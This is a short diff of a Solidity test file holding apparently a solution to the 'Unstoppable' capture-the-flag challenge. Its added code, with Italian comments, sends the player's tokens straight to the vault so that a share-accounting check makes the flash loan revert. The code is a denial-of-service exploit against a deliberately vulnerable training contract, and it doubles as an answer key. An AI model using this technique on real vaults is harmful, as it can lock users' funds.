@@ -91,7 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Inviamo tutti i nostri 10 DVT iniziali al vault.
+        // Una quantità così grande (10e18 wei) sbilancerà sicuramente la divisione intera 
+        // in convertToShares e forzerà il revert in flashLoan.
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
